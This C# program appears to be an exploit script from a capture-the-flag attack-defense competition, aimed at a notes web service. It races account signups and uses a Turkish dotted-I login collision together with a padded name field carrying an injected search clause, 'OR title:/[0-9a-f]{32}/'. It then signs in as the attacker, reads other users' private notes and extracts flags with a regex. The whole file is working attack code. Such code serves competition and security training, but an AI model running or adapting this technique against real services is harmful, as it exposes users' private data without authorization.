using System;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace notexplt
{
	static class Program
	{
		static async Task Main(string[] args)
		{
			if(args.Length == 2 && int.TryParse(args[1], out var port))
				BaseUri = new Uri($"http://{args[0]}:{port}/");

			using var handler = new SocketsHttpHandler {MaxConnectionsPerServer = 100500, PooledConnectionIdleTimeout = TimeSpan.FromMinutes(1)};
			using var client = new HttpClient(handler, true) {BaseAddress = BaseUri};

			using var result1 = await client.PostAsync($"{SignUpRelative}?login={SecretLogin}&name={SecretName}&password={SecretPassword}", null);
			if(result1.StatusCode != HttpStatusCode.OK && result1.StatusCode != (HttpStatusCode)409)
				throw new Exception($"{SignUpRelative} failed with HTTP {(int)result1.StatusCode} -> {await result1.Content.ReadAsStringAsync()}");

			if(result1.StatusCode == HttpStatusCode.OK)
			{
				using var result2 = await client.PostAsync($"{AddNoteRelative}?title=secret&text={SecretMessageToCheck}&isPrivate=on", null);
				if(result2.StatusCode != HttpStatusCode.OK)
					throw new Exception($"{AddNoteRelative} failed with HTTP {(int)result2.StatusCode} -> {await result2.Content.ReadAsStringAsync()}");
			}

			for(int i = 0; i < 100; i++)
			{
				var hacker1 = HackerLoginPrefix + "_i" + i.ToString("x3");
				var hacker2 = HackerLoginPrefix + "_\u0130" + i.ToString("x3");

				var tasks = new[]
				{
					client.PostAsync($"{SignUpRelative}?login={hacker1}&name={HackerName}&password={HackerPassword}", null),
					client.PostAsync($"{SignUpRelative}?login={hacker2}&name={new string('A', HackerName.Length + hacker1.Length + 1)}%20%20%20OR%20title%3A%2F[0-9a-f]{{32}}%2F&password={HackerPassword}", null)
				};

				await Task.WhenAll(tasks);

				Console.WriteLine(string.Join("\r\n", tasks.Select(t => $"{i:x3}: HTTP {t.Result.StatusCode} {t.Result.ReasonPhrase}")));

				var cookie = new CookieContainer();
				using var client2 = new HttpClient(new HttpClientHandler {CookieContainer = cookie}, true) {BaseAddress = BaseUri};

				using var result3 = await client2.PostAsync($"{SignInRelative}?login={hacker1}&password={HackerPassword}", null);
				if(result3.StatusCode != HttpStatusCode.OK)
					throw new Exception($"{SignInRelative} failed with HTTP {(int)result3.StatusCode} -> {await result3.Content.ReadAsStringAsync()}");

				var result = await client2.GetStringAsync($"{SearchRelative}?myOnly=on");
				if(result.Contains(SecretMessageToCheck))
				{
					Console.WriteLine($"Pwned! Hacker credentials '{hacker1}:{HackerPassword}', sign in to get all private messages!");
					var flags = string.Join("\n", FlagRegex.Matches(result).Select(m => m.Value));
					Console.WriteLine(flags == string.Empty ? "No flags found" : "Some flags:\n" + flags);
					return;
				}
			}
		}

		private static Uri BaseUri = new Uri("http://localhost:5073/");

		private const string SignUpRelative = "/auth/signup";
		private const string SignInRelative = "/auth/signin";

		private const string AddNoteRelative = "/notes/add";
		private const string SearchRelative = "/notes/search";

		private static readonly Regex FlagRegex = new Regex(@"\b[0-9A-Za-z]{31}=", RegexOptions.Compiled);

		private const string SecretLogin = "super_secret_usr";
		private const string SecretName = "secret";
		private const string SecretPassword = "secret";
		private const string SecretMessageToCheck = "secret_message_read_me_pls";

		private const string HackerName = "some_hacker_name";
		private const string HackerLoginPrefix = "hacker";
		private const string HackerPassword = "pass";
	}
}
